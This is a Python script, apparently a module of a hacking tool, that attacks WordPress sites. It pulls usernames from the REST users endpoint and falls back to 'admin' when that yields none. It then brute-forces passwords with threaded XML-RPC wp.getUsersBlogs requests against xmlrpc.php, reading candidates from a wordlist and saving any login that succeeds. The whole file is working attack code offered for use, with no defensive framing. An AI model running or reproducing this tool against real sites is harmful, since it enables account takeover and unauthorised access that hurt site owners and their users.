#!/usr/bin/python3
########################################
# Github : http://github.com/galehrizky#
# Facebook : Galeh Rizky               #
# Email : galehrizky@codelatte.org     #
# visit : c0delabs.com                 #
# this module created by galeh rizky   #
########################################

import requests,sys,json
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor
from galer.module import save
from galer.module import local_time
from galer.module import check_array

def fetching_user(url):
	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
	user_list = []
	try:
		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
		try:
			print(colored("[{}][!] Success Fetching user from {}".format(local_time(),url), "green"))
			for x in json.loads(req):
				user_list.append(x['slug'])
		except ValueError:
			print(colored("[{}][!] Failed {} to Decoding json !\n".format(local_time(),url), "red"))
		
	except Exception as e:
		print(colored("[{}][!] Something Wrong !".format(local_time()), "red"))

	return user_list

def exploit(url, user_url, list_password):
	try:
		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)

		headers = {'Content-Type':'text/xml'}
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
		if "isAdmin" in str(r.content):
			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
		else:
			print(colored("[{}][-] Failed Login {} With username {} password {}".format(local_time(),url,user_url, list_password), "red"))
	except requests.exceptions.ConnectionError as e:
		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
	except Exception as e:
			print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))

def brute_url(url):
	try:
		username_url = fetching_user(url)
		user = []
		if check_array(username_url):
			for username in username_url:
				user.append(username)
		else:
			print(colored('[{}][+] try With default username [admin]'.format(local_time()), "green"))
			user.append("admin")

		password = "wordlist.txt"

		with ThreadPoolExecutor(max_workers=10) as executor:
			for user_url in user:
				with open(password, "r") as password_list:
					for list_password in password_list:
						executor.submit(exploit,url,user_url,list_password)


			user.clear()
	except requests.exceptions.ConnectionError as e:
		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
	except Exception as e:
		print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))

def go_brute(url):
	try:
		print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
		brute_url(url)
		print(colored("[+] End Brute Force on {}".format(local_time()), "yellow"))
	except KeyboardInterrupt as e:
		print("[{}][!] Exit Program".format(local_time()))
		sys.exit()